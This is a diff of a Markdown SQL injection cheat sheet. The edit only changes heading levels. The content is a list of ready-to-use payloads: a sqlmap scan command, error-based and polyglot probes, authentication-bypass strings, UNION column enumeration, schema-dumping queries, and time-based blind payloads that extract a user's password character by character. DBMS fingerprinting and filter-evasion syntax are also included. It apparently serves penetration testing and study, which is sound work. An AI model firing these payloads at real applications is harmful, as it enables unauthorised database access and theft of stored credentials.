@@ -1,32 +1,32 @@
 SQL Injection
 =============
 
-# Overview
+## Overview
 
 SQL injection (SQLi) is a type of data and control confusion vulnerability which arises when client side elements are combined with SQL queries in an insecure fashion. SQLi typically occurs when an attacker can escape parameters in the query early to directly alter the syntax of the query. 
 
-# Anatomy of a SQL Query
+## Anatomy of a SQL Query
 
-## Vulnerable Login Query
+### Vulnerable Login Query
 
 ![SQL Query](./images/vuln_login_query_anatomy.png)
 
 
-# Tooling
+## Tooling
 
-## [SQL Map](https://github.com/sqlmapproject/sqlmap#sqlmap-)
+### [SQL Map](https://github.com/sqlmapproject/sqlmap#sqlmap-)
 
 + Completely blind SQLi testing tool
 
-### Basic Scan
+#### Basic Scan
 
 `python3 sqlmap.py -u https://target.domain.com?param_to_test=1`
 
-## [jSQL](https://github.com/ron190/jsql-injection#description)
+### [jSQL](https://github.com/ron190/jsql-injection#description)
 
-# Basic Identification Payloads
+## Basic Identification Payloads
 
-## Error Based
+### Error Based
 
 + They payloads aim to create a malformed SQL query which violates the SQL syntax.
 + If debugging messages are enabled these payloads will produce error messages or broken pages
@@ -43,23 +43,23 @@ SQL injection (SQLi) is a type of data and control confusion vulnerability which
 
 	`%`
 
-### Polyglot
+#### Polyglot
 
 `'/**/"# -- `
 
-## Blind 
+### Blind 
 
 `' sleep(5)#`
 
 `" sleep(5)#`
 
-### Polyglot
+#### Polyglot
 
 `'" 1 or sleep(5)# -- `
  
-# General Payloads
+## General Payloads
 
-## Overflow Filter Conditions
+### Overflow Filter Conditions
 
 `' OR 1='1`
 
@@ -107,7 +107,7 @@ SQL injection (SQLi) is a type of data and control confusion vulnerability which
 
 `1-true`
 
-## Order By && Group By Manipulation
+### Order By && Group By Manipulation
 
 `" ORDER BY 1`
 
@@ -119,7 +119,7 @@ SQL injection (SQLi) is a type of data and control confusion vulnerability which
 
 `' GROUP BY column_names having 1=1 --`
 
-## Blind/Time Delay Based
+### Blind/Time Delay Based
 
 `' sleep(5)`
 
@@ -130,7 +130,7 @@ SQL injection (SQLi) is a type of data and control confusion vulnerability which
 `" or sleep(5)`
 
 
-# Union Payloads
+## Union Payloads
 
 + Union based payloads exploit a vulnerable query structure, typically containing a SELECT, to inject an appended query 
 onto a legitimate query
@@ -139,16 +139,16 @@ onto a legitimate query
 	+ Search results page
 + UNION based payloads require the exploiter to have knowledge of the number of columns referenced in the original query in order to craft a valid UNION statement
 
-## Anatomy of a UNION Payload
+### Anatomy of a UNION Payload
 
 ![UNION payload diagram](./images/UNION_payload_diagram.png)
 
-## Column Number Enumeration
+### Column Number Enumeration
 
 + Aims to determine how many columns are present in a table via error checking
 + Once the injection yields an error the number of columns will be one less than the index of the current injection
 
-### Order By Approach
+#### Order By Approach
 
 ```
 ' ORDER BY 1-- 
@@ -157,7 +157,7 @@ onto a legitimate query
 ' ORDER BY 4-- 
 ' ORDER BY 5-- error 
 ```
-### NULL Indexing
+#### NULL Indexing
 
 ```
 ' UNION SELECT NULL--
@@ -165,7 +165,7 @@ onto a legitimate query
 ' UNION SELECT NULL,NULL,NULL--
 ```
 
-## General UNION Payloads
+### General UNION Payloads
 
 `' UNION SELECT number,of,columns FROM information_schema.tables; -- `
 
@@ -174,9 +174,9 @@ onto a legitimate query
 `' UNION SELECT number,of,columns FROM known_table_name; -- `
 
 
-# Dump Schema
+## Dump Schema
 
-## MySQL > PostgreSQL > Microsoft
+### MySQL > PostgreSQL > Microsoft
 
 `SELECT * FROM information_schema.tables`
 
@@ -185,13 +185,13 @@ onto a legitimate query
 `SELECT * FROM information_schema.columns WHERE table_name = 'known_table_name'`
 
 
-## Oracle
+### Oracle
 
 `SELECT * FROM all_tables`
 
 `SELECT * FROM all_tab_columns`
 
-# Blind Payloads
+## Blind Payloads
 
 + Blind SQLi occurs when a web application, or other infrastructure that communicates with a DB, is vulnerable to SQL injection but does not return debugging errors of any kind to the client
 + Therefore in order to exploit a blind SQL injection vulnerability an attacker must find a way to enumerate tables and columns in the database in order to exfiltrate database contents
@@ -199,33 +199,33 @@ onto a legitimate query
 	+ Many tools like SQLmap use this kind of approach
 + Alternatively an attacker can inject payloads and see which ones result in the page returning results or not
 
-## Anatomy of a Blind SQLi Payload
+### Anatomy of a Blind SQLi Payload
 
 ![Anatomy Of a Blind SQLi payload diagram](./images/Blind_SQLi_Diagram.png)
 
-## General Payloads
+### General Payloads
 
-### MySQL
+#### MySQL
 
 `' UNION SELECT IF(SUBSTRING(table_name,1,1) = CHAR(character_decimal_value), sleep(5), 'no') FROM information_schema.tables LIMIT 1;# `
 
 `' UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;`
 
-### PostgreSQL
+#### PostgreSQL
 
 `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`
 
-### Microsoft
+#### Microsoft
 
 `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10' `
 
-# Payload Utilities
+## Payload Utilities
 
 + SQL artifacts to place within payloads
 
-## SQL Comments 
+### SQL Comments 
 
-### MySQL
+#### MySQL
 
 ```
 #
@@ -236,7 +236,7 @@ onto a legitimate query
 
 ```
 
-### SQLite
+#### SQLite
 
 ```
 #
@@ -246,7 +246,7 @@ onto a legitimate query
 --comment
 ```
 
-### PostgreSQL
+#### PostgreSQL
 
 ```
 --comment
@@ -254,7 +254,7 @@ onto a legitimate query
 /*comment*/
 ```
 
-### Microsoft SQL
+#### Microsoft SQL
 
 ```
 --comment
@@ -262,104 +262,104 @@ onto a legitimate query
 /*comment*/
 ```
 
-### Oracle
+#### Oracle
 
 ```
 --comment
 ```
 
-## Substrings
+### Substrings
 
-### General Syntax
+#### General Syntax
 
 `SUBSTRING('the_string', start_index, number_of_chars)`
 
-### MySQL
+#### MySQL
 
 `SUBSTRING('string', 1, 1)`
 
-### PostgreSQL
+#### PostgreSQL
 
 `SUBSTRING('string', 1, 1)`
 
-### Oracle
+#### Oracle
 
 `SUBSTR('string', 1, 1)`
 
-### Microsoft
+#### Microsoft
 
 `SUBSTRING ('string', 1,1)`
 
-## String Concatenation
+### String Concatenation
 
 + Join strings together
 	+ In some cases can be used to join columns
 
-### MySQL
+#### MySQL
 
 `CONCAT(str,ing)`
 
-### PostgreSQL
+#### PostgreSQL
 
 `'str'||'ING'`
 
-### Oracle
+#### Oracle
 
 `'str'||'ing'`
 
-### Microsoft
+#### Microsoft
 
 `'str'||'ing'`
 
-## CHAR Codes
+### CHAR Codes
 
 + [ASCII table](https://www.asciitable.xyz)
 
-# Fingerprinting Payloads
+## Fingerprinting Payloads
 
-## Versions
+### Versions
 
 + Used to determine database version numbers
 
-### MySQL
+#### MySQL
 
 `SELECT @@version`
 
-### PostgreSQL
+#### PostgreSQL
 
 `SELECT version()`
 
-### Oracle
+#### Oracle
 
 `SELECT banner FROM v$version`
 
 `SELECT version FROM v$instance`  
 
-### Microsoft
+#### Microsoft
 
 `SELECT @@version`
 
-## Database Name
+### Database Name
 
-### MySQL
+#### MySQL
 
 `SELECT DATABASE()`
 
-## System User
+### System User
 
-### MySQL
+#### MySQL
 
 `SELECT SYSTEM_USER();`
 
-## Session User Instance
+### Session User Instance
 
-### MySQL
+#### MySQL
 
 `SELECT SESSION_USER();`
 
-# Filter Evasion
+## Filter Evasion
 
-## Bitwise Alternatives
+### Bitwise Alternatives
 
 ### OR Replacement
 
@@ -369,7 +369,7 @@ onto a legitimate query
 
 `' & 1='1'`
 
-# Resources
+## Resources
 
 + [Portswigger SQLi Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 + [Portswigger UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
